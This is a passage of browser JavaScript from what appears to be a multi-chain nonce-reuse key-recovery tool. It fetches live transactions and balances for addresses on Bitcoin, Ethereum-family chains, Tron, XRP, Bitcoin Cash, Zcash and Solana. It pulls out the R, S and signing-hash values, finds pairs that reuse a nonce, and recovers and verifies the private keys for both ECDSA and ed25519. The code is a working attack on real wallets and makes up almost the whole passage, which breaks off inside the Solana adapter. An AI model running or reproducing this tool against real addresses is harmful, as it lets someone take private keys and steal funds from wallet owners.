            method: isGet ? 'GET' : 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: isGet ? undefined : JSON.stringify(body),
            signal: AbortSignal.timeout(timeout || 12000)
        });
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        return await resp.json();
    }
    // JSON-RPC 2.0 across a list of endpoints with fallback
    async function rpcCall(urls, method, params, timeout) {
        let lastErr;
        for (const url of urls) {
            try {
                const resp = await fetch(url, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: method, params: params }),
                    signal: AbortSignal.timeout(timeout || 12000)
                });
                if (!resp.ok) { lastErr = new Error('HTTP ' + resp.status); continue; }
                const j = await resp.json();
                if (j && j.error) { lastErr = new Error((j.error && j.error.message) || 'rpc error'); continue; }
                if (j && j.result !== undefined && j.result !== null) return j.result;
                lastErr = new Error('empty result');
            } catch (e) { lastErr = e; }
            await sleep(120);
        }
        throw lastErr || new Error('all RPC endpoints failed');
    }
    // XRPL JSON-RPC (different envelope: {result:{...}})
    async function xrplRpc(urls, method, params) {
        let lastErr;
        for (const url of urls) {
            try {
                const resp = await fetch(url, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ method: method, params: params }),
                    signal: AbortSignal.timeout(15000)
                });
                if (!resp.ok) { lastErr = new Error('HTTP ' + resp.status); continue; }
                const j = await resp.json();
                if (j && j.result) {
                    if (j.result.status === 'error') { lastErr = new Error(j.result.error_message || j.result.error || 'xrpl error'); continue; }
                    return j.result;
                }
                lastErr = new Error('empty result');
            } catch (e) { lastErr = e; }
            await sleep(150);
        }
        throw lastErr || new Error('all XRPL endpoints failed');
    }

    // ---- lazy library loaders (ethers UMD + noble ESM) ------------------
    let _ethersPromise = null;
    function loadScriptOnce(src) {
        return new Promise(function (res, rej) {
            const have = Array.prototype.some.call(document.scripts, function (s) { return s.src === src; });
            if (have) return res();
            const el = document.createElement('script');
            el.src = src; el.async = true;
            el.onload = function () { res(); };
            el.onerror = function () { rej(new Error('Failed to load ' + src)); };
            document.head.appendChild(el);
        });
    }
    async function ensureEthers() {
        if (window.ethers) return window.ethers;
        if (!_ethersPromise) {
            const url = (window.CGT_LIBS && window.CGT_LIBS.ethers) || 'https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js';
            _ethersPromise = loadScriptOnce(url);
        }
        await _ethersPromise;
        for (let i = 0; i < 160 && !window.ethers; i++) await sleep(50);
        if (!window.ethers) throw new Error('ethers library failed to load');
        return window.ethers;
    }
    const _esmCache = {};
    function loadEsm(url) { if (!_esmCache[url]) _esmCache[url] = import(url); return _esmCache[url]; }
    function nobleBase(which) {
        const d = { curves: 'https://esm.sh/@noble/curves@1.8.1', hashes: 'https://esm.sh/@noble/hashes@1.7.1' };
        if (which === 'curves') return (window.CGT_LIBS && window.CGT_LIBS.noble_curves) || d.curves;
        return (window.CGT_LIBS && window.CGT_LIBS.noble_hashes) || d.hashes;
    }
    async function ensureEd25519() { const m = await loadEsm(nobleBase('curves') + '/ed25519'); return m.ed25519 || m; }
    async function ensureSha512() { const m = await loadEsm(nobleBase('hashes') + '/sha512'); return m.sha512; }
    async function ensureBlake2b() { const m = await loadEsm(nobleBase('hashes') + '/blake2b'); return m.blake2b; }

    // ---- verification gate ----------------------------------------------
    // secp256k1: private key hex -> compressed public key hex (via ethers)
    async function deriveSecpPub(dHex) {
        const e = await ensureEthers();
        const sk = new e.SigningKey('0x' + strip0x(dHex));
        return strip0x(sk.compressedPublicKey).toLowerCase();
    }
    // normalise any secp256k1 pubkey (compressed/uncompressed) to compressed hex
    function normSecpPub(pub) {
        try { if (window.ethers) return strip0x(window.ethers.SigningKey.computePublicKey('0x' + strip0x(pub), true)).toLowerCase(); } catch (e) { }
        return strip0x(pub).toLowerCase();
    }

    // ---- recovery (secp256k1 reuses recover_private_key; ed25519 own) ----
    async function recoverSecp(a, b) {
        if (!a.z || !b.z) return { pk: null, verified: false, mismatch: true };  // no signing-hash -> cannot recover
        const pk = recover_private_key(
            hexToBigInt(a.r), hexToBigInt(a.s), hexToBigInt(b.s),
            hexToBigInt(a.z), hexToBigInt(b.z)
        );
        if (typeof pk === 'string' && pk.indexOf('ERROR') === 0) return { pk: pk, error: true };
        let verified = null;
        try {
            const got = await deriveSecpPub(pk);               // ensures ethers is loaded
            if (a.pub) { const want = normSecpPub(a.pub); verified = (got === want); if (!verified) return { pk: null, verified: false, mismatch: true }; }
        } catch (e) { verified = null; }                       // couldn't verify (offline) -> show best-effort
        return { pk: pk, verified: verified };
    }
    // Ed25519: a = (s1 - s2) * (h1 - h2)^-1 mod L, h = SHA512(R || A || M) mod L.
    // M (the signed message) is stored in the .z slot by the ed25519 adapters.
    async function recoverEd25519(a, b) {
        try {
            const ed = await ensureEd25519();
            const sha512 = await ensureSha512();
            const L = (ed.CURVE && ed.CURVE.n) ? ed.CURVE.n : BigInt('0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed');
            const Rb = hexToBytes(a.r), Ab = hexToBytes(a.pub);
            const h1 = bytesToBigIntLE(sha512(concatBytes(Rb, Ab, hexToBytes(a.z)))) % L;
            const h2 = bytesToBigIntLE(sha512(concatBytes(Rb, Ab, hexToBytes(b.z)))) % L;
            const s1 = bytesToBigIntLE(hexToBytes(a.s)), s2 = bytesToBigIntLE(hexToBytes(b.s));
            const hd = ((h1 - h2) % L + L) % L, sd = ((s1 - s2) % L + L) % L;
            if (hd === 0n) return { pk: null, verified: false, mismatch: true };
            const scalar = (sd * modInverse(hd, L)) % L;
            // verify scalar*B == A
            const P = ed.ExtendedPoint.BASE.multiply(scalar === 0n ? L : scalar);
            const A2 = strip0x(bytesToHex(P.toRawBytes())).toLowerCase();
            if (A2 !== strip0x(a.pub).toLowerCase()) return { pk: null, verified: false, mismatch: true };
            return { pk: scalar.toString(16).padStart(64, '0'), verified: true };
        } catch (e) { return { pk: null, error: true, pkMsg: e.message }; }
    }
    // Find every reused-R pair across the signature set and recover+verify.
    async function recoverVulns(rsz) {
        const vulns = [];
        for (let i = 0; i < rsz.length; i++) {
            for (let j = i + 1; j < rsz.length; j++) {
                const a = rsz[i], b = rsz[j];
                if (!(a.r && a.r === b.r && a.s !== b.s)) continue;
                const curve = a.curve || 'secp256k1';
                let rec;
                if (curve === 'ed25519') rec = await recoverEd25519(a, b);
                else rec = await recoverSecp(a, b);
                vulns.push(Object.assign({ i: i, j: j, curve: curve }, rec));
            }
        }
        return vulns;
    }

    // ---- shared data-source helpers (UTXO explorers) --------------------
    async function blockchairRawTx(chain, txid) {
        const j = await getJson('https://api.blockchair.com/' + chain + '/raw/transaction/' + txid, 15000);
        const d = j && j.data && j.data[txid];
        const raw = d && (d.raw_transaction || d.raw_tx);
        if (!raw) throw new Error('raw transaction not found');
        return raw;
    }
    async function blockcypherRawTx(coin, txid) {
        const j = await getJson('https://api.blockcypher.com/v1/' + coin + '/main/txs/' + txid + '?includeHex=true&limit=1', 15000);
        if (!j || !j.hex) throw new Error('raw transaction not found');
        return j.hex;
    }
    async function blockchairAddrTxids(chain, addr, want) {
        const j = await getJson('https://api.blockchair.com/' + chain + '/dashboards/address/' + addr + '?limit=' + Math.min(want, 10000), 15000);
        const d = j && j.data && j.data[addr];
        if (!d) return null;
        return (d.transactions || []).slice(0, want);
    }
    async function blockchairAddrStats(chain, addr) {
        const j = await getJson('https://api.blockchair.com/' + chain + '/dashboards/address/' + addr + '?limit=0', 15000);
        const a = j && j.data && j.data[addr] && j.data[addr].address;
        if (!a) return null;
        return { balance: BigInt(a.balance || 0), received: BigInt(a.received || 0), tx: a.transaction_count || 0 };
    }

    function classifyUtxo(t) { t = t.trim(); if (t.length === 64 && /^[0-9a-fA-F]+$/.test(t)) return 'txid'; if (t.indexOf(':') !== -1 && t.indexOf('r') !== 0) { /* cashaddr with prefix */ } if (t.length >= 20 && !/\s/.test(t) && t.split(':').length <= 2) return 'address'; return 'bulk'; }
    function classifyEvm(t) { t = t.trim(); if (/^0x[0-9a-fA-F]{64}$/.test(t)) return 'txid'; if (/^0x[0-9a-fA-F]{40}$/.test(t)) return 'address'; return 'bulk'; }

    // ---- ADAPTERS --------------------------------------------------------

    // Bitcoin — wraps the original, battle-tested functions unchanged.
    const bitcoin = {
        key: 'bitcoin', curve: 'secp256k1', symbol: 'BTC', decimals: 8,
        formatAmount: function (v) { return formatBtc(v); },
        classifyInput: function (t) { t = t.trim(); if (t.length === 64 && /^[0-9a-fA-F]+$/.test(t)) return 'txid'; if (t.length >= 26 && t.length <= 62 && t.indexOf(':') === -1) return 'address'; return 'bulk'; },
        fetchStats: function (addr) { return fetchAddressStats(addr); },
        txidToRSZ: async function (txid) { const raw = await getRawTx(txid); const parsed = parsingRaw(raw); const rsz = getrsz(parsed); rsz.forEach(function (e) { if (!e.txid) e.txid = txid.toLowerCase(); }); return rsz; },
        addressToRSZ: function (addr, want, onProgress) { return fetchBlockchainData(addr, want, onProgress); }
    };

    // Litecoin / Dogecoin — identical UTXO engine, different address version.
    function makeUtxoAdapter(key, cfg) {
        return {
            key: key, curve: 'secp256k1', symbol: cfg.symbol, decimals: 8,
            formatAmount: function (v) { return formatUnits(v, 8, cfg.symbol); },
            classifyInput: classifyUtxo,
            fetchStats: async function (addr) { try { return await blockchairAddrStats(cfg.chain, addr); } catch (e) { return null; } },
            txidToRSZ: async function (txid) {
                let raw; try { raw = await blockchairRawTx(cfg.chain, txid); } catch (e) { raw = await blockcypherRawTx(cfg.coin, txid); }
                const parsed = parsingRaw(raw);
                const rsz = getrsz(parsed, { p2pkhVersion: cfg.version });
                rsz.forEach(function (e) { if (!e.txid) e.txid = txid.toLowerCase(); });
                return rsz;
            },
            addressToRSZ: async function (addr, want, onProgress) {
                const txids = await blockchairAddrTxids(cfg.chain, addr, want);
                if (txids === null) return null;
                if (!txids.length) return [];
                const out = []; let scanned = 0; const BATCH = 3;
                for (let b = 0; b < txids.length; b += BATCH) {
                    const slice = txids.slice(b, b + BATCH);
                    const settled = await Promise.all(slice.map(async function (h) {
                        try {
                            let raw; try { raw = await blockchairRawTx(cfg.chain, h); } catch (e) { raw = await blockcypherRawTx(cfg.coin, h); }
                            const parsed = parsingRaw(raw);
                            return getrsz(parsed, { p2pkhVersion: cfg.version }).filter(function (it) { return it.addr === addr; }).map(function (it) { it.txid = h; return it; });
                        } catch (e) { return []; }
                    }));
                    settled.forEach(function (a) { a.forEach(function (it) { out.push(it); }); });
                    scanned += slice.length;
                    if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: txids.length, found: out.length });
                    await sleep(350);
                }
                return out;
            }
        };
    }

    // EVM family — ethers reconstructs the signing hash (Z) exactly.
    const EVM = {
        ethereum: { symbol: 'ETH', chainId: 1, rpcs: ['https://eth.llamarpc.com', 'https://ethereum-rpc.publicnode.com', 'https://eth.drpc.org', 'https://1rpc.io/eth'], blockscout: 'https://eth.blockscout.com' },
        bnb: { symbol: 'BNB', chainId: 56, rpcs: ['https://bsc-dataseed.bnbchain.org', 'https://bsc-rpc.publicnode.com', 'https://bsc.drpc.org', 'https://1rpc.io/bnb'], blockscout: '' },
        arbitrum: { symbol: 'ETH', chainId: 42161, rpcs: ['https://arbitrum.llamarpc.com', 'https://arbitrum-one-rpc.publicnode.com', 'https://arbitrum.drpc.org', 'https://1rpc.io/arb'], blockscout: 'https://arbitrum.blockscout.com' },
        optimism: { symbol: 'ETH', chainId: 10, rpcs: ['https://optimism.llamarpc.com', 'https://optimism-rpc.publicnode.com', 'https://optimism.drpc.org', 'https://1rpc.io/op'], blockscout: 'https://explorer.optimism.io' },
        base: { symbol: 'ETH', chainId: 8453, rpcs: ['https://base.llamarpc.com', 'https://base-rpc.publicnode.com', 'https://base.drpc.org', 'https://1rpc.io/base'], blockscout: 'https://base.blockscout.com' },
        polygon: { symbol: 'POL', chainId: 137, rpcs: ['https://polygon.llamarpc.com', 'https://polygon-bor-rpc.publicnode.com', 'https://polygon.drpc.org', 'https://1rpc.io/matic'], blockscout: 'https://polygon.blockscout.com' },
        avalanche: { symbol: 'AVAX', chainId: 43114, rpcs: ['https://avalanche-c-chain-rpc.publicnode.com', 'https://avalanche.drpc.org', 'https://1rpc.io/avax/c'], blockscout: '' },
        zksync: { symbol: 'ETH', chainId: 324, rpcs: ['https://mainnet.era.zksync.io', 'https://zksync-era.blockpi.network/v1/rpc/public', 'https://zksync.drpc.org', 'https://1rpc.io/zksync2-era'], blockscout: 'https://zksync.blockscout.com' }
    };
    function evmSigningHash(e, tx) {
        const type = tx.type == null ? 0 : Number(BigInt(tx.type));
        const base = {
            type: type,
            to: tx.to || null,
            nonce: Number(BigInt(tx.nonce)),
            gasLimit: BigInt(tx.gas),
            value: BigInt(tx.value || '0x0'),
            data: tx.input || '0x',
            chainId: tx.chainId != null ? BigInt(tx.chainId) : (type === 0 ? 0n : undefined)
        };
        if (type === 0 || type === 1) base.gasPrice = BigInt(tx.gasPrice);
        if (type === 1 || type === 2) base.accessList = tx.accessList || [];
        if (type === 2) { base.maxFeePerGas = BigInt(tx.maxFeePerGas); base.maxPriorityFeePerGas = BigInt(tx.maxPriorityFeePerGas); }
        const t = e.Transaction.from(base);
        return e.keccak256(t.unsignedSerialized);
    }
    function makeEvmAdapter(key, cfg) {
        return {
            key: key, curve: 'secp256k1', symbol: cfg.symbol, decimals: 18,
            formatAmount: function (v) { return formatUnits(v, 18, cfg.symbol); },
            classifyInput: classifyEvm,
            fetchStats: async function (addr) {
                try {
                    const bal = await rpcCall(cfg.rpcs, 'eth_getBalance', [addr, 'latest']);
                    let tx = 0; try { tx = Number(BigInt(await rpcCall(cfg.rpcs, 'eth_getTransactionCount', [addr, 'latest']))); } catch (e) { }
                    return { balance: BigInt(bal), received: null, tx: tx };
                } catch (e) { return null; }
            },
            txidToRSZ: async function (txid) {
                const e = await ensureEthers();
                const tx = await rpcCall(cfg.rpcs, 'eth_getTransactionByHash', [txid]);
                if (!tx) throw new Error('Transaction not found');
                if (tx.r == null || tx.s == null) throw new Error('Transaction has no ECDSA signature');
                let z = '', pub = '', addr = tx.from || '';
                try {
                    z = evmSigningHash(e, tx);                 // may throw on tx types ethers can't serialize (e.g. EIP-7702 type 4)
                    const type = tx.type == null ? 0 : Number(BigInt(tx.type));
                    let sig;
                    if (type >= 1) { const yp = Number(BigInt(tx.yParity != null ? tx.yParity : tx.v)); sig = e.Signature.from({ r: tx.r, s: tx.s, yParity: yp }); }
                    else { sig = e.Signature.from({ r: tx.r, s: tx.s, v: Number(BigInt(tx.v)) }); }
                    const pubU = e.SigningKey.recoverPublicKey(z, sig); pub = strip0x(e.SigningKey.computePublicKey(pubU, true)); addr = e.computeAddress(pubU);
                } catch (e2) { z = ''; }                       // degrade: show R/S, withhold key (gate)
                return [{ input_index: 0, txid: txid, addr: addr, pub: pub, r: strip0x(tx.r), s: strip0x(tx.s), z: z ? strip0x(z) : '', curve: 'secp256k1', noZ: !z }];
            },
            addressToRSZ: async function (addr, want, onProgress) {
                let list = null;
                const off = Math.min(want * 3, 10000);
                // 1) Blockscout (keyless) where this chain has an instance — most reliable.
                if (cfg.blockscout) {
                    try { const j = await getJson(cfg.blockscout + '/api?module=account&action=txlist&address=' + addr + '&sort=desc&page=1&offset=' + off, 20000); if (j && Array.isArray(j.result)) list = j.result; } catch (e) { }
                }
                // 2) Routescan etherscan-compatible (covers Avalanche + a few) — keyless fallback.
                if (!list) {
                    const rs = 'https://api.routescan.io/v2/network/mainnet/evm/' + cfg.chainId + '/etherscan/api?module=account&action=txlist&address=' + addr + '&startblock=0&endblock=99999999&sort=desc&page=1&offset=' + off;
                    try { const j = await getJson(rs, 20000); if (j && Array.isArray(j.result)) list = j.result; } catch (e) { }
                }
                // 3) Optional user GoldRush/Covalent key — unlocks chains with no keyless
                //    indexer (e.g. BNB). The key is read from the visitor's own browser only.
                if (!list) {
                    const key = getUserKey();
                    if (key) {
                        const cv = 'https://api.covalenthq.com/v1/' + cfg.chainId + '/address/' + addr + '/transactions_v3/?no-logs=true&page-size=' + Math.min(want, 100) + '&key=' + encodeURIComponent(key);
                        try {
                            const j = await getJson(cv, 25000);
                            const items = j && j.data && Array.isArray(j.data.items) ? j.data.items : null;
                            if (items) list = items.map(function (it) { return { hash: it.tx_hash, from: it.from_address }; });
                        } catch (e) { }
                    }
                }
                if (!list) return null;
                const lower = addr.toLowerCase();
                const hashes = list.filter(function (t) { return (t.from || '').toLowerCase() === lower && (t.hash || t.transactionHash); }).map(function (t) { return t.hash || t.transactionHash; });
                const uniq = Array.from(new Set(hashes)).slice(0, want);
                if (!uniq.length) return [];
                const out = []; let scanned = 0; const self = this; const BATCH = 4;
                for (let b = 0; b < uniq.length; b += BATCH) {
                    const slice = uniq.slice(b, b + BATCH);
                    const settled = await Promise.all(slice.map(function (h) { return self.txidToRSZ(h).catch(function () { return []; }); }));
                    settled.forEach(function (a) { a.forEach(function (it) { if ((it.addr || '').toLowerCase() === lower) out.push(it); }); });
                    scanned += slice.length;
                    if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: uniq.length, found: out.length });
                    await sleep(200);
                }
                return out;
            }
        };
    }

    // Tron — secp256k1; Z = sha256(raw_data).
    function tronAddrFromPub(e, pubU) {
        const clean = strip0x(pubU); const body = clean.slice(2);           // drop 0x04 prefix
        const hash = strip0x(e.keccak256('0x' + body)); const eth = hash.slice(-40);
        const h = '41' + eth; const chk = dblsha256(h).slice(0, 8); return b58encode(h + chk);
    }
    const tron = {
        key: 'tron', curve: 'secp256k1', symbol: 'TRX', decimals: 6,
        formatAmount: function (v) { return formatUnits(v, 6, 'TRX'); },
        classifyInput: function (t) { t = t.trim(); if (/^[0-9a-fA-F]{64}$/.test(t)) return 'txid'; if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t)) return 'address'; return 'bulk'; },
        fetchStats: async function (addr) { try { const j = await getJson('https://api.trongrid.io/v1/accounts/' + addr, 15000); const d = j && j.data && j.data[0]; if (d) return { balance: BigInt(d.balance || 0), received: null, tx: null }; } catch (e) { } return null; },
        txidToRSZ: async function (txid) {
            const tx = await postJson('https://api.trongrid.io/wallet/gettransactionbyid', { value: txid }, 15000);
            if (!tx || !tx.raw_data_hex || !tx.signature || !tx.signature.length) throw new Error('Transaction not found or has no signature');
            const z = sha256hex(tx.raw_data_hex);
            const sigHex = tx.signature[0];
            const r = sigHex.slice(0, 64), s = sigHex.slice(64, 128), v = parseInt(sigHex.slice(128, 130), 16);
            let pub = '', addr = '';
            try { const e = await ensureEthers(); const sig = e.Signature.from({ r: '0x' + r, s: '0x' + s, yParity: (v % 2) }); const pubU = e.SigningKey.recoverPublicKey('0x' + z, sig); pub = strip0x(e.SigningKey.computePublicKey(pubU, true)); addr = tronAddrFromPub(e, pubU); } catch (e2) { }
            return [{ input_index: 0, txid: txid, addr: addr, pub: pub, r: r, s: s, z: z, curve: 'secp256k1' }];
        },
        addressToRSZ: async function (addr, want, onProgress) {
            let list = null;
            try { const j = await getJson('https://api.trongrid.io/v1/accounts/' + addr + '/transactions?limit=' + Math.min(want, 200) + '&only_from=true', 20000); if (j && Array.isArray(j.data)) list = j.data; } catch (e) { }
            if (!list) return null;
            const hashes = list.map(function (t) { return t.txID; }).filter(Boolean).slice(0, want);
            if (!hashes.length) return [];
            const out = []; let scanned = 0; const self = this;
            for (let b = 0; b < hashes.length; b += 3) {
                const slice = hashes.slice(b, b + 3);
                const settled = await Promise.all(slice.map(function (h) { return self.txidToRSZ(h).catch(function () { return []; }); }));
                settled.forEach(function (a) { a.forEach(function (it) { out.push(it); }); });
                scanned += slice.length;
                if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: hashes.length, found: out.length });
                await sleep(250);
            }
            return out;
        }
    };

    // XRP — secp256k1; Z = SHA512Half(0x53545800 || serialized-tx-without-TxnSignature).
    const XRP_RPCS = ['https://xrplcluster.com', 'https://xrpl.ws', 'https://s1.ripple.com:51234'];
    async function xrpSigningHash(txJson) {
        const codec = await loadEsm('https://esm.sh/ripple-binary-codec@1.11.0');
        const toSign = Object.assign({}, txJson);
        ['TxnSignature', 'hash', 'meta', 'metaData', 'validated', 'ledger_index', 'inLedger', 'date', 'ledger_hash', 'status'].forEach(function (k) { delete toSign[k]; });
        const signingHex = codec.encodeForSigning(toSign);
        const sha512 = await ensureSha512();
        return strip0x(bytesToHex(sha512(hexToBytes(signingHex)).slice(0, 32)));
    }
    async function xrpOne(txJson, txid) {
        if (!txJson || !txJson.TxnSignature || !txJson.SigningPubKey) throw new Error('Transaction has no signature');
        if (/^ED/i.test(txJson.SigningPubKey)) throw new Error('This XRP account signs with ed25519 (not ECDSA R-reuse).');
        const der = parseDER(txJson.TxnSignature);
        if (!der.r) throw new Error('Could not parse DER signature');
        let z = ''; try { z = await xrpSigningHash(txJson); } catch (e) { z = ''; }
        return { input_index: 0, txid: txid || txJson.hash || '', addr: txJson.Account || '', pub: (txJson.SigningPubKey || '').toLowerCase(), r: der.r, s: der.s, z: z, curve: 'secp256k1', noZ: !z };
    }
    const xrp = {
        key: 'xrp', curve: 'secp256k1', symbol: 'XRP', decimals: 6,
        note: 'XRP signing-hash is reconstructed with ripple-binary-codec; if it cannot load, R and S are still shown but the key is withheld.',
        formatAmount: function (v) { return formatUnits(v, 6, 'XRP'); },
        classifyInput: function (t) { t = t.trim(); if (/^[0-9A-Fa-f]{64}$/.test(t)) return 'txid'; if (/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/.test(t)) return 'address'; return 'bulk'; },
        fetchStats: async function (addr) { try { const j = await getJson('https://api.xrpscan.com/api/v1/account/' + addr, 15000); if (j && j.xrpBalance != null) return { balance: BigInt(Math.round(parseFloat(j.xrpBalance) * 1e6)), received: null, tx: j.sequence || 0 }; } catch (e) { } return null; },
        txidToRSZ: async function (txid) { const res = await xrplRpc(XRP_RPCS, 'tx', [{ transaction: txid, binary: false }]); return [await xrpOne(res, txid)]; },
        addressToRSZ: async function (addr, want, onProgress) {
            let txs = null;
            try { const res = await xrplRpc(XRP_RPCS, 'account_tx', [{ account: addr, limit: Math.min(want, 200), binary: false, forward: false }]); txs = res && res.transactions; } catch (e) { }
            if (!txs) return null;
            const out = []; let scanned = 0;
            for (const row of txs) {
                const tj = row.tx || row.tx_json || row;
                try { const one = await xrpOne(tj, tj.hash); if (one.Account !== addr && one.addr !== addr) { /* keep anyway if signed by addr */ } out.push(one); } catch (e) { }
                scanned++;
                if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: txs.length, found: out.length });
            }
            return out.filter(function (it) { return it.addr === addr; });
        }
    };

    // Bitcoin Cash — secp256k1; Z = BIP143 preimage with SIGHASH_ALL|FORKID (0x41).
    function bchExtract(tx) {
        const inputs = tx.inputs || [], outputs = tx.outputs || [];
        let prevouts = '', seqs = '', outs = '';
        inputs.forEach(function (inp) {
            const ptx = inp.txid || (inp.outpoint && inp.outpoint.hash) || '';
            const vout = inp.output != null ? inp.output : (inp.outpoint && inp.outpoint.index != null ? inp.outpoint.index : 0);
            prevouts += reverseHex(ptx) + intToLEHex(vout, 4);
            seqs += intToLEHex(inp.sequence != null ? inp.sequence : 0xffffffff, 4);
        });
        outputs.forEach(function (o) { const spk = o.pkscript || o.script || ''; outs += intToLEHex(o.value != null ? o.value : 0, 8) + varIntHex(spk.length / 2) + spk; });
        const hashPrevouts = dblsha256(prevouts), hashSequence = dblsha256(seqs), hashOutputs = dblsha256(outs);
        const version = intToLEHex(tx.version != null ? tx.version : 1, 4), locktime = intToLEHex(tx.locktime != null ? tx.locktime : 0, 4);
        const res = [];
        inputs.forEach(function (inp, i) {
            const sigscript = inp.sigscript || inp.scriptsig || '';
            if (!sigscript) return;
            const sd = parseScriptSig(sigscript);
            if (!sd.r || !sd.pub) return;
            const h160 = ripe160hex(sha256hex(sd.pub));
            const scriptCode = '1976a914' + h160 + '88ac';
            const ptx = inp.txid || (inp.outpoint && inp.outpoint.hash) || '';
            const vout = inp.output != null ? inp.output : (inp.outpoint && inp.outpoint.index != null ? inp.outpoint.index : 0);
            const amount = intToLEHex(inp.value != null ? inp.value : 0, 8);
            const nSeq = intToLEHex(inp.sequence != null ? inp.sequence : 0xffffffff, 4);
            const preimage = version + hashPrevouts + hashSequence + reverseHex(ptx) + intToLEHex(vout, 4) + scriptCode + amount + nSeq + hashOutputs + locktime + '41000000';
            res.push({ input_index: i, txid: tx.txid || tx.hash || '', addr: pubToAddr_P2PKH(sd.pub, '00'), pub: sd.pub, r: sd.r, s: sd.s, z: dblsha256(preimage), curve: 'secp256k1' });
        });
        return res;
    }
    const bch = {
        key: 'bitcoin-cash', curve: 'secp256k1', symbol: 'BCH', decimals: 8,
        formatAmount: function (v) { return formatUnits(v, 8, 'BCH'); },
        classifyInput: classifyUtxo,
        fetchStats: async function (addr) { try { const j = await getJson('https://api.haskoin.com/bch/address/' + encodeURIComponent(addr) + '/balance', 15000); if (j) return { balance: BigInt((j.confirmed || 0) + (j.unconfirmed || 0)), received: BigInt(j.received || 0), tx: j.txs || 0 }; } catch (e) { } return null; },
        txidToRSZ: async function (txid) { const tx = await getJson('https://api.haskoin.com/bch/transaction/' + txid, 15000); const r = bchExtract(tx); if (!r.length) throw new Error('No P2PKH ECDSA inputs found'); return r; },
        addressToRSZ: async function (addr, want, onProgress) {
            let list = null;
            try { const j = await getJson('https://api.haskoin.com/bch/address/' + encodeURIComponent(addr) + '/transactions/full?limit=' + Math.min(want, 100), 20000); if (Array.isArray(j)) list = j; } catch (e) { }
            if (!list) return null;
            const out = []; let scanned = 0;
            for (const tx of list) { try { bchExtract(tx).forEach(function (s) { out.push(s); }); } catch (e) { } scanned++; if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: list.length, found: out.length }); }
            return out;
        }
    };

    // Zcash — transparent inputs; R/S extracted. ZIP-243 sighash not yet wired,
    // so the key is withheld (gate) rather than shown wrong.
    const zcash = {
        key: 'zcash', curve: 'secp256k1', symbol: 'ZEC', decimals: 8,
        note: 'Zcash transparent R and S are extracted. Automated key recovery needs the ZIP-243/ZIP-244 signing-hash, which is not yet enabled — so no key is shown unless it can be verified.',
        formatAmount: function (v) { return formatUnits(v, 8, 'ZEC'); },
        classifyInput: classifyUtxo,
        fetchStats: async function (addr) { try { return await blockchairAddrStats('zcash', addr); } catch (e) { return null; } },
        txidToRSZ: async function (txid) {
            const j = await getJson('https://api.blockchair.com/zcash/dashboards/transaction/' + txid, 15000);
            const d = j && j.data && j.data[txid]; if (!d) throw new Error('Transaction not found');
            const res = []; (d.inputs || []).forEach(function (inp, i) { const ss = inp.spending_signature_hex || ''; if (!ss) return; const sd = parseScriptSig(ss); if (!sd.r) return; res.push({ input_index: i, txid: txid, addr: inp.recipient || '', pub: sd.pub || '', r: sd.r, s: sd.s, z: '', curve: 'secp256k1', noZ: true }); });
            if (!res.length) throw new Error('No transparent ECDSA inputs (shielded tx?)');
            return res;
        },
        addressToRSZ: async function (addr, want, onProgress) {
            const ids = await blockchairAddrTxids('zcash', addr, want);
            if (ids === null) return null; if (!ids.length) return [];
            const out = []; let scanned = 0; const self = this;
            for (let b = 0; b < ids.length; b += 3) { const slice = ids.slice(b, b + 3); const settled = await Promise.all(slice.map(function (h) { return self.txidToRSZ(h).catch(function () { return []; }); })); settled.forEach(function (a) { a.forEach(function (it) { out.push(it); }); }); scanned += slice.length; if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: ids.length, found: out.length }); await sleep(350); }
            return out;
        }
    };

    // Solana — ed25519. R = sig[0:32], S = sig[32:64], message stored in .z.
    const SOL_RPCS = ['https://solana-rpc.publicnode.com', 'https://api.mainnet-beta.solana.com', 'https://1rpc.io/sol', 'https://solana.drpc.org'];
    function solParse(rawB64, txSig) {
        const raw = b64ToBytes(rawB64);
        let off = 0; const ns = readCompactU16(raw, off); off += ns.size;
        const sigs = []; for (let k = 0; k < ns.val; k++) { sigs.push(raw.slice(off, off + 64)); off += 64; }
        const msg = raw.slice(off);
        let moff = 0; if (msg[0] & 0x80) moff = 1;                 // versioned (v0) prefix byte
        const numReqSig = msg[moff]; moff += 3;                    // header: reqSig, roSigned, roUnsigned
        const ac = readCompactU16(msg, moff); moff += ac.size;
        const accounts = []; for (let k = 0; k < ac.val; k++) { accounts.push(msg.slice(moff, moff + 32)); moff += 32; }
        const out = [];
        for (let k = 0; k < sigs.length; k++) {
            const sg = sigs[k]; let allZero = true; for (let z = 0; z < sg.length; z++) { if (sg[z] !== 0) { allZero = false; break; } }
            if (allZero) continue;
            const A = accounts[k] || accounts[0];
            out.push({ input_index: k, txid: txSig, addr: b58encode(bytesToHex(A)), pub: bytesToHex(A), r: bytesToHex(sg.slice(0, 32)), s: bytesToHex(sg.slice(32, 64)), z: bytesToHex(msg), curve: 'ed25519' });
        }
        return out;
    }
    const solana = {
        key: 'solana', curve: 'ed25519', symbol: 'SOL', decimals: 9,
        formatAmount: function (v) { return formatUnits(v, 9, 'SOL'); },
        classifyInput: function (t) { t = t.trim(); if (/^[1-9A-HJ-NP-Za-km-z]{80,90}$/.test(t)) return 'txid'; if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(t)) return 'address'; return 'bulk'; },
        fetchStats: async function (addr) { try { const bal = await rpcCall(SOL_RPCS, 'getBalance', [addr]); const v = bal && bal.value != null ? bal.value : bal; return { balance: BigInt(v || 0), received: null, tx: null }; } catch (e) { return null; } },
        txidToRSZ: async function (sig) {
            const res = await rpcCall(SOL_RPCS, 'getTransaction', [sig, { encoding: 'base64', maxSupportedTransactionVersion: 0 }]);
            if (!res || !res.transaction) throw new Error('Transaction not found');
            return solParse(res.transaction[0], sig);
        },
        addressToRSZ: async function (addr, want, onProgress) {
            let list = null;
